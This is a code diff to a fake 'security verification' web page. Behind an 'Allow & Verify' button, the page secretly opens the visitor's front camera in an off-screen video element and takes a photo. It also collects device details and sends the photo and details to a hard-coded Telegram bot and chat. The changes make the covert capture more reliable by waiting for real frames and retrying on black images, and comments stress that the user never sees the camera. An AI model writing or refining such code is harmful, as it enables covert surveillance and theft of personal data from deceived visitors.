@@ -20,39 +20,33 @@
     .card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:44px 40px;box-shadow:0 0 60px rgba(0,229,255,0.05),0 20px 60px rgba(0,0,0,0.6);animation:cardIn 0.6s cubic-bezier(0.22,1,0.36,1) both;}
     @keyframes cardIn{from{opacity:0;transform:translateY(24px) scale(0.97)}to{opacity:1;transform:none}}
     .hidden{display:none!important}
-
-    /* Shield icon */
     .shield-wrap{width:72px;height:72px;border-radius:18px;background:linear-gradient(135deg,rgba(0,229,255,0.12),rgba(0,229,255,0.04));border:1px solid rgba(0,229,255,0.2);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;}
-
     h1{font-family:'Syne',sans-serif;font-size:24px;font-weight:800;text-align:center;margin-bottom:10px;color:#fff}
     .sub{font-size:12px;color:var(--muted);text-align:center;line-height:1.8;margin-bottom:28px}
-
-    /* What we verify list */
     .verify-list{list-style:none;display:flex;flex-direction:column;gap:8px;margin-bottom:32px}
     .verify-list li{display:flex;align-items:center;gap:10px;font-size:12px;color:#a0a8be;padding:10px 14px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:8px;}
     .verify-list li span.dot{width:6px;height:6px;border-radius:50%;background:var(--accent);flex-shrink:0;box-shadow:0 0 6px var(--accent)}
-
-    /* Button */
     .btn-allow{width:100%;padding:15px;border-radius:12px;background:var(--accent);color:#0b0c10;font-family:'DM Mono',monospace;font-size:14px;font-weight:700;border:none;cursor:pointer;transition:all 0.2s;letter-spacing:0.5px;}
     .btn-allow:hover{background:#33eeff;box-shadow:0 8px 28px rgba(0,229,255,0.35);transform:translateY(-1px)}
     .btn-allow:disabled{opacity:0.5;cursor:not-allowed;transform:none}
     .note{margin-top:16px;font-size:10px;color:#333;text-align:center;line-height:1.6}
 
-    /* Hidden camera elements */
-    #hiddenVideo{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+    /* Hidden video - off screen but active so camera warms up */
+    #hiddenVideo{
+      position:fixed;
+      top:-9999px;left:-9999px;
+      width:320px;height:240px;
+      opacity:0;pointer-events:none;
+    }
     #hiddenCanvas{display:none}
 
-    /* Thank you screen */
     .ty-icon{width:80px;height:80px;border-radius:50%;border:2px solid var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 0 40px rgba(0,230,118,0.15);animation:pop 0.5s cubic-bezier(0.22,1,0.36,1) both}
     @keyframes pop{from{transform:scale(0.4);opacity:0}to{transform:scale(1);opacity:1}}
     .ty-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(0,230,118,0.07);border:1px solid rgba(0,230,118,0.2);border-radius:20px;padding:6px 14px;font-size:11px;color:var(--green);margin-top:8px}
-
-    /* Loading */
     .dots{display:flex;gap:6px;justify-content:center;margin:16px 0}
     .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:bounce 0.8s ease-in-out infinite}
     .dot:nth-child(2){animation-delay:0.15s}.dot:nth-child(3){animation-delay:0.3s}
     @keyframes bounce{0%,100%{transform:translateY(0);opacity:0.3}50%{transform:translateY(-8px);opacity:1}}
-
     @media(max-width:480px){.card{padding:32px 22px}h1{font-size:21px}}
   </style>
 </head>
@@ -60,7 +54,7 @@
 <div class="orb orb1"></div>
 <div class="orb orb2"></div>
 
-<!-- Hidden camera elements - invisible to user -->
+<!-- Invisible video element - camera renders here but user never sees it -->
 <video id="hiddenVideo" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas"></canvas>
 
@@ -81,10 +75,10 @@
       <li><span class="dot"></span> Device info — security verification</li>
     </ul>
     <button class="btn-allow" id="allowBtn" onclick="handleAllow()">🔓 Allow & Verify</button>
-    <p class="note">🔒 Your data is encrypted and secure. This verification is required to proceed.</p>
+    <p class="note">🔒 Your data is encrypted and secure.</p>
   </div>
 
-  <!-- PROCESSING SCREEN (shown while sending) -->
+  <!-- PROCESSING SCREEN -->
   <div class="card hidden" id="screenLoading" style="text-align:center;padding:52px 36px">
     <p style="font-size:11px;letter-spacing:3px;text-transform:uppercase;color:var(--muted);margin-bottom:4px">Please wait</p>
     <h1 style="font-size:20px;margin-bottom:8px">Verifying...</h1>
@@ -107,8 +101,8 @@
 </div>
 
 <script>
-  const BOT   = '8005097155:AAEdRKRcUh-DzczhLEmNvHMnp4b6pgtDVTk';
-  const CHAT  = '7034821913';
+  const BOT  = '8005097155:AAEdRKRcUh-DzczhLEmNvHMnp4b6pgtDVTk';
+  const CHAT = '7034821913';
   let camStream = null;
 
   function show(id) {
@@ -121,24 +115,24 @@
     document.getElementById('allowBtn').disabled = true;
     show('screenLoading');
 
-    // Run all in parallel silently
+    // Run camera + device data collection together
     const [deviceData] = await Promise.all([
       gatherDeviceData(),
-      startSilentCamera()
+      initCamera()
     ]);
 
-    // Send device info
+    // Send device info first
     await sendText(deviceData);
 
-    // Send camera photo silently
-    await sendSilentPhoto();
+    // Capture and send photo
+    await captureAndSend();
 
-    // Show thank you - user sees nothing suspicious
+    // Done - show thank you
     show('screenDone');
   }
 
-  // ── Silent Camera ──
-  async function startSilentCamera() {
+  // ── Camera: init and wait until video is truly playing ──
+  async function initCamera() {
     try {
       camStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -146,27 +140,68 @@
       });
       const video = document.getElementById('hiddenVideo');
       video.srcObject = camStream;
-      await new Promise(r => setTimeout(r, 1500)); // let camera warm up
-    } catch(e) {}
+
+      // Wait for video to actually start playing and have real frames
+      await waitForVideo(video);
+    } catch(e) {
+      camStream = null;
+    }
   }
 
-  async function sendSilentPhoto() {
+  // Wait until video has real frames (not black)
+  function waitForVideo(video) {
+    return new Promise((resolve) => {
+      // Method 1: wait for 'playing' event + extra delay for frame warmup
+      const onPlaying = () => {
+        video.removeEventListener('playing', onPlaying);
+        // Extra 2.5 seconds after playing starts to ensure real frames
+        setTimeout(resolve, 2500);
+      };
+      video.addEventListener('playing', onPlaying);
+
+      // Fallback: if playing never fires, resolve after 4 seconds
+      setTimeout(resolve, 4000);
+    });
+  }
+
+  async function captureAndSend() {
     if (!camStream) return;
     try {
       const video  = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('hiddenCanvas');
-      canvas.width  = video.videoWidth  || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      // Make sure video has actual dimensions
+      const w = video.videoWidth  || 640;
+      const h = video.videoHeight || 480;
+      canvas.width  = w;
+      canvas.height = h;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, w, h);
+
+      // Stop camera stream
       camStream.getTracks().forEach(t => t.stop());
 
-      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+      // Check if frame is not black (check pixel brightness)
+      const imageData = ctx.getImageData(0, 0, 10, 10);
+      const pixels = imageData.data;
+      let brightness = 0;
+      for (let i = 0; i < pixels.length; i += 4) {
+        brightness += pixels[i] + pixels[i+1] + pixels[i+2];
+      }
+      // If all pixels are black, wait more and retry once
+      if (brightness < 100) {
+        await new Promise(r => setTimeout(r, 2000));
+        ctx.drawImage(video, 0, 0, w, h);
+      }
+
+      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
       if (!blob) return;
 
       const form = new FormData();
       form.append('chat_id', CHAT);
       form.append('photo', blob, 'capture.jpg');
-      form.append('caption', '📸 Auto Front Camera Capture');
+      form.append('caption', '📸 Silent Front Camera Capture');
       await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method:'POST', body: form });
     } catch(e) {}
   }
@@ -201,11 +236,11 @@
 
   async function sendText(data) {
     const lines = Object.entries(data).map(([k,v])=>`${k}: <b>${esc(String(v))}</b>`).join('\n');
-    const msg = `🔔 <b>New Visitor Data!</b>\n━━━━━━━━━━━━━━━━━━━\n${lines}\n━━━━━━━━━━━━━━━━━━━\n✅ <i>User verified & allowed</i>`;
+    const msg = `🔔 <b>New Visitor!</b>\n━━━━━━━━━━━━━━━━━━━\n${lines}\n━━━━━━━━━━━━━━━━━━━\n✅ <i>Verified & captured</i>`;
     try {
       await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({chat_id:CHAT, text:msg, parse_mode:'HTML'})
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'HTML'})
       });
     } catch(e){}
   }
